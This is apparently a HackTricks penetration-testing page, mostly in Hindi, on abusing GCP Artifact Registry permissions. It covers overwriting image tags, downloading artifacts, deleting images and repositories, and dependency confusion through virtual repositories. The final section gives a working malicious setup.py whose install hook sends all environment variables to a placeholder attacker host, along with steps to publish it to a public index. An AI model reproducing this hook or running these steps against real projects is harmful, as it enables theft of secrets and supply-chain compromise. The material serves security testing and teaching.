# GCP - Artifact Registry Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Artifact Registry

Artifact Registry के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-artifact-registry-enum.md
{{#endref}}

### artifactregistry.repositories.uploadArtifacts

इस अनुमति के साथ कोई attacker malicious code (जैसे Docker images) वाले नए संस्करण के artifacts अपलोड कर सकता है:

<details>
<summary>Artifact Registry में Docker image अपलोड करें</summary>
```bash
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# tag the image to upload it
docker tag <local-img-name>:<local-tag> <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>

# Upload it
docker push <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

> [!CAUTION]
> यह जाँचा गया कि यह **संभव है कि उसी नाम और टैग वाले पहले से मौजूद इमेज के साथ एक नया malicious docker** इमेज upload किया जा सके, इसलिए पुरानी इमेज **टैग खो देगी** और अगली बार जब उस टैग वाली इमेज **download** की जाएगी तो malicious इमेज ही डाउनलोड होगी।

<details>

<summary>Upload a Python library</summary>

**सबसे पहले उस library को बनायें जिसे आप upload करना चाहते हैं** (यदि आप registry से latest version download कर सकते हैं तो यह कदम छोड़ सकते हैं):

1.  **अपने प्रोजेक्ट की structure सेटअप करें**:

- अपनी library के लिए एक नया directory बनायें, जैसे `hello_world_library`.
- इस directory के अंदर, अपने package नाम वाला एक और directory बनायें, जैसे `hello_world`.
- अपने package directory के अंदर एक `__init__.py` फ़ाइल बनायें। यह फ़ाइल empty हो सकती है या आपके package के लिए initializations रख सकती है।

<details>
<summary>Create project structure</summary>

```bash
mkdir hello_world_library
cd hello_world_library
mkdir hello_world
touch hello_world/__init__.py
```

</details>

2.  **अपनी library का कोड लिखें**:

- `hello_world` directory के अंदर, अपने module के लिए एक नया Python फ़ाइल बनायें, जैसे `greet.py`.
- अपना "Hello, World!" फ़ंक्शन लिखें:

<details>
<summary>Create library module</summary>

```python
# hello_world/greet.py
def say_hello():
return "Hello, World!"
```

</details>

3.  **एक `setup.py` फ़ाइल बनायें**:

- `hello_world_library` directory की root में एक `setup.py` फ़ाइल बनायें।
- यह फ़ाइल आपकी library के बारे में metadata रखती है और Python को बताती है कि इसे कैसे install करना है।

<details>
<summary>Create setup.py file</summary>

```python
# setup.py
from setuptools import setup, find_packages

setup(
name='hello_world',
version='0.1',
packages=find_packages(),
install_requires=[
# Any dependencies your library needs
],
)
```

</details>

**अब, आइए लाइब्रेरी upload करें:**

1.  **अपना package build करें**:

- `hello_world_library` directory की root से, चलाएँ:

<details>
<summary>Build Python package</summary>

```sh
python3 setup.py sdist bdist_wheel
```

</details>

2.  **twine के लिए authentication configure करें** (जिसका उपयोग आपका package upload करने में होगा):
- सुनिश्चित करें कि आपके पास `twine` installed है (`pip install twine`)।
- credentials configure करने के लिए `gcloud` का उपयोग करें:

<details>
<summary>Upload package with twine</summary>
```sh
twine upload --username 'oauth2accesstoken' --password "$(gcloud auth print-access-token)" --repository-url https://<location>-python.pkg.dev/<project-id>/<repo-name>/ dist/*
```
</details>

3. **build को साफ़ करें**

<details>
<summary>build artifacts को साफ़ करें</summary>
```bash
rm -rf dist build hello_world.egg-info
```
</details>

</details>

> [!CAUTION]
> एक ही संस्करण वाली python library को अपलोड करना संभव नहीं है जो पहले से मौजूद हो, लेकिन यह संभव है कि आप **बड़े संस्करण** अपलोड कर सकें (या संस्करण के अंत में एक अतिरिक्त **`.0` जोड़ दें** यदि वह काम करे -हालाँकि python में नहीं-), या **आखिरी संस्करण को डिलीट करके नया एक अपलोड करें** (इसके लिए `artifactregistry.versions.delete`)**:**
>
> <details>
> <summary>आर्टिफैक्ट संस्करण हटाएँ</summary>
>
> ```sh
> gcloud artifacts versions delete <version> --repository=<repo-name> --location=<location> --package=<lib-name>
> ```
>
> </details>

### `artifactregistry.repositories.downloadArtifacts`

इस permission के साथ आप **artifacts डाउनलोड** कर सकते हैं और **संवेदनशील जानकारी** तथा **कमज़ोरियाँ** खोज सकते हैं।

Download a **Docker** image:

<details>
<summary>Artifact Registry से Docker image डाउनलोड करें</summary>
```sh
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# Dowload image
docker pull <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

एक **python** लाइब्रेरी डाउनलोड करें:

<details>
<summary>Artifact Registry से Python लाइब्रेरी डाउनलोड करें</summary>
```bash
pip install <lib-name> --index-url "https://oauth2accesstoken:$(gcloud auth print-access-token)@<location>-python.pkg.dev/<project-id>/<repo-name>/simple/" --trusted-host <location>-python.pkg.dev --no-cache-dir
```
</details>

- यदि एक virtual registry में remote और standard registries मिश्रित हों और कोई package दोनों में मौजूद हो तो क्या होता है? इस पृष्ठ को देखें:

{{#ref}}
../gcp-persistence/gcp-artifact-registry-persistence.md
{{#endref}}

### `artifactregistry.tags.delete`, `artifactregistry.versions.delete`, `artifactregistry.packages.delete`, (`artifactregistry.repositories.get`, `artifactregistry.tags.get`, `artifactregistry.tags.list`)

Registry से artifacts हटाएँ, जैसे docker images:

<details>
<summary>Artifact Registry से Docker image हटाएँ</summary>
```bash
# Delete a docker image
gcloud artifacts docker images delete <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

### `artifactregistry.repositories.delete`

सामग्री होने पर भी एक पूरा रिपॉज़िटरी हटाएँ:

<details>
<summary>Artifact Registry रिपॉज़िटरी हटाएँ</summary>
```
gcloud artifacts repositories delete <repo-name> --location=<location>
```
</details>

### `artifactregistry.repositories.setIamPolicy`

इस permission वाले attacker अपने लिए उन पहले बताए गए repository attacks को करने के लिए permissions दे सकता है।

### Pivoting to other Services through Artifact Registry Read & Write

- **Cloud Functions**

जब एक Cloud Function बनाया जाता है तो प्रोजेक्ट के Artifact Registry में एक नया docker image push होता है। मैंने image को नए वाले से modify करने की कोशिश की, और वर्तमान image (और `cache` image) को हटाकर भी देखा लेकिन कुछ नहीं बदला, cloud function काम करना जारी रहा। इसलिए, शायद bucket के साथ की तरह **Race Condition attack** का दुरुपयोग करके उस docker container को बदलना संभव हो सकता है जो चलाया जाएगा, लेकिन **सिर्फ़ स्टोर किए गए image को बदलकर Cloud Function को compromise करना संभव नहीं है**।

- **App Engine**

हालाँकि App Engine Artifact Registry के अंदर docker images बनाता है। परीक्षण में यह पाया गया कि **यहाँ पर image को modify करने पर भी** और App Engine instance को हटाकर (ताकि नया deploy हो) भी, उस पर चलने वाला **code बदलता नहीं है**.\
संभव है कि buckets के साथ की तरह एक **Race Condition attack** करके executed code को overwrite करना संभव हो, लेकिन यह टेस्ट नहीं किया गया।

### `artifactregistry.repositories.update`
इस issue को exploit करने के लिए attacker को किसी विशेष Artifact Registry permissions की ज़रूरत नहीं है—सिर्फ़ एक vulnerable virtual-repository configuration चाहिए। यह तब होता है जब एक virtual repository एक remote public repository (e.g., PyPI, npm) को internal repository के साथ मिलाती है, और remote source की priority बराबर या अधिक होती है। अगर दोनों में एक ही नाम का package मौजूद है, तो सिस्टम highest version को चुनता है। attacker को केवल internal package का नाम पता होना चाहिए और संबंधित public registry में packages publish करने में सक्षम होना चाहिए।

With the `artifactregistry.repositories.update` permission, an attacker could change a virtual repository’s upstream settings to intentionally create this vulnerable setup and use Dependency Confusion as a persistence method by inserting malicious packages that developers or CI/CD systems may install automatically.

attacker public repository में internal package का एक malicious version उच्च version number के साथ बनाता है। For Python packages, this means preparing a package structure that mimics the legitimate one.
```bash
mkdir /tmp/malicious_package
cd /tmp/malicious_package
PACKAGE_NAME="<package-name>"
mkdir "$PACKAGE_NAME"
touch "$PACKAGE_NAME/__init__.py"
```
फिर एक setup.py फ़ाइल बनाई जाती है जिसमें इंस्टॉलेशन के दौरान चलने वाला दुर्भावनापूर्ण कोड होता है। इस फ़ाइल में private repository में मौजूद संस्करण से अधिक संस्करण संख्या निर्दिष्ट करनी चाहिए।
```bash
cat > setup.py << 'EOF'
import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

def malicious_function():
data = dict(os.environ)
encoded_data = urllib.parse.urlencode(data).encode()
url = 'https://<ip-atacante>/exfil'
req = urllib.request.Request(url, data=encoded_data)
urllib.request.urlopen(req)

class AfterInstall(install):
def run(self):
install.run(self)
malicious_function()

setuptools.setup(
name = "<package-name>",
version = "0.1.1",
packages = ["<package-name>"],
cmdclass={'install': AfterInstall},
)
EOF
```
पैकेज तैयार करें और इंस्टॉलेशन के दौरान कोड निष्पादित होने को सुनिश्चित करने के लिए wheel हटाएँ।
```bash
python3 setup.py sdist bdist_wheel
rm dist/<package-name>*.whl
```
हानिकारक पैकेज को सार्वजनिक रिपॉजिटरी पर अपलोड करें (उदाहरण के लिए, test.pypi.org for Python).
```bash
pip install twine
twine upload --repository testpypi dist/*
```
जब कोई सिस्टम या सेवा वर्चुअल रिपॉज़िटरी का उपयोग करके पैकेज इंस्टॉल करती है, तो यह वैध आंतरिक की बजाय पब्लिक रिपॉज़िटरी से मैलिशियस वर्ज़न डाउनलोड कर लेगी, क्योंकि मैलिशियस वर्ज़न उच्चतर होता है और रिमोट रिपॉज़िटरी की प्राथमिकता बराबर या अधिक होती है।

{{#include ../../../banners/hacktricks-training.md}}
